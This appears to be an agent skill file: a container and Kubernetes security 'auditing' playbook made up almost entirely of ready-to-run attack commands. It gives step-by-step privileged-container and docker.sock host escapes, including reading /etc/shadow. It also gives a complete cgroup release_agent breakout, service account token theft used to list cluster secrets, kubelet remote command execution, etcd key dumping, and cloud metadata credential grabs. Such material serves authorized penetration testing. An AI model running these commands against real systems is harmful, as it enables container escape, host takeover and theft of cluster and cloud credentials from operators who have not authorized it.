---
name: container-kubernetes-security
description: >-
  Container and Kubernetes security auditing: container detection (.dockerenv, cgroup v1/v2, mountinfo), breakout vectors (privileged mode, /var/run/docker.sock, dangerous capabilities CAP_SYS_ADMIN/CAP_SYS_PTRACE/CAP_DAC_OVERRIDE, cgroup notify_on_release, runc CVEs), Kubernetes cluster audits (kubelet 10250/10255 API, unauthorized etcd 2379, service account token theft, RBAC privilege escalation, hostPath/hostPID/hostNetwork abuse, admission controller bypass, cloud metadata IMDS pivot). Use when auditing containers, Docker, containerd, Kubernetes, EKS/GKE/AKS clusters, or pod isolation.
metadata:
  tags: [container-security, kubernetes, cloud-native, devsecops]
---

## Container & Kubernetes Security Auditing Playbook

```
=== Phase 1: Container Environment & Isolation Assessment ===
Detection & Marker Check:
  ls -la /.dockerenv | cat /proc/1/cgroup | grep -E 'docker|containerd|kubepods|podman'
  cat /proc/1/mountinfo | grep -E 'overlay|shm|docker' | cat /proc/1/cmdline | tr '\0' ' '
  env | grep -iE 'kubernetes|docker|k8s|service_host'
Namespace Isolation Verification:
  ls -la /proc/1/ns/ | ls -la /proc/self/ns/
  Compare PID/MNT/IPC/NET/UTS inode IDs: identical inode = host namespace shared (hostPID/hostNetwork/hostIPC active)!
Capability Boundary Analysis:
  capsh --print | cat /proc/1/status | grep -iE 'capeff|capbnd'
  Decode: capsh --decode=<HexCap>
  Critical Risk Capabilities:
    CAP_SYS_ADMIN: mount filesystems, unshare namespaces, manipulate cgroups -> direct escape path.
    CAP_SYS_PTRACE: ptrace host processes if PID namespace shared -> inject shellcode via /proc/$PID/mem.
    CAP_DAC_OVERRIDE / CAP_DAC_READ_SEARCH: bypass file permission checks across host mounts.
    CAP_SYS_MODULE: compile and insert malicious kernel module -> host ring 0 execution.
    CAP_NET_ADMIN / CAP_NET_RAW: spoof ARP/traffic, manipulate iptables, sniff host interfaces.

=== Phase 2: Container Breakout Vectors & Verification ===
1. Privileged Container Breakout:
   fdisk -l | lsblk -f -> identify host root disk partition (e.g. /dev/sda1, /dev/vda1, /dev/nvme0n1p1)
   Exploit: mkdir -p /tmp/host_root && mount /dev/vda1 /tmp/host_root
   Verification: cat /tmp/host_root/etc/shadow | chroot /tmp/host_root /bin/bash
2. Exposed Runtime Socket:
   find / -name "*docker.sock" -o -name "*containerd.sock" 2>/dev/null
   /var/run/docker.sock exposed:
     docker -H unix:///var/run/docker.sock ps
     docker -H unix:///var/run/docker.sock run -v /:/host -it --rm alpine chroot /host sh
   Raw HTTP via curl if docker binary missing:
     curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
     curl -s -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock \
       -d '{"Image":"alpine","Cmd":["chroot","/host","id"],"Binds":["/:/host"]}' http://localhost/containers/create
3. Cgroup v1 notify_on_release Breakout (CAP_SYS_ADMIN):
   mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
   echo 1 > /tmp/cgrp/x/notify_on_release
   host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab) # or /proc/mounts overlay perdir
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
   echo '#!/bin/sh' > /cmd && echo 'id > '"$host_path"'/output' >> /cmd && chmod +x /cmd
   sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" # trigger release agent execution on host
4. Runtimes & CVE Vectors:
   runc CVE-2024-21626 (Leaky Vessels): check if cwd is /proc/self/fd/7 -> overwrite host binary.
   runc CVE-2019-5736: overwrite /bin/sh inside container with script that hijacks host runc binary on exec.
   DirtyCOW / DirtyPipe / GameOver(lay) kernel exploits: uname -r audit against vulnerable Linux kernel ranges.

=== Phase 3: Kubernetes Cluster Assessment ===
1. Service Account & Pod Identity Audit:
   Path: /var/run/secrets/kubernetes.io/serviceaccount/
   Token: token | Namespace: namespace | CA: ca.crt
   Query API Server:
     K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
     curl -sk -H "Authorization: Bearer $K8S_TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/secrets
   RBAC Permission Enumeration:
     kubectl auth can-i --list --token=$K8S_TOKEN
     High-risk permissions:
       create pods / deployments -> spawn privileged pod with hostPath: /
       get/list secrets -> dump all cluster passwords, TLS keys, and tokens
       impersonate -> escalate to system:masters
       bind / escalate (roles) -> grant self cluster-admin privileges
2. Kubelet API Auditing:
   Port 10250 (HTTPS) / Port 10255 (HTTP read-only):
     curl -sk https://<node_ip>:10250/pods -> enumerate all pods on node
     curl -sk -X POST https://<node_ip>:10250/run/<namespace>/<pod>/<container> -d "cmd=id" -> remote execution without API server
3. etcd Datastore Security:
   Port 2379 (etcd client port):
     etcdctl --endpoints=https://<etcd_ip>:2379 get "" --prefix --keys-only
     If unauthenticated: full cluster compromise (extract all tokens, certificates, and config).
4. Cloud-Native Managed K8s IMDS Pivoting:
   Pods in EKS/GKE/AKS without metadata protection:
     curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
     curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
   Check for IRSA (EKS IAM Roles for Service Accounts) token: /var/run/secrets/eks.amazonaws.com/serviceaccount/token
5. Cluster Hardening Verification:
   Run automated audit tools: kube-bench (CIS Benchmark), kube-hunter (external/internal cluster penetration), trivy (container CVE & misconfig).
```
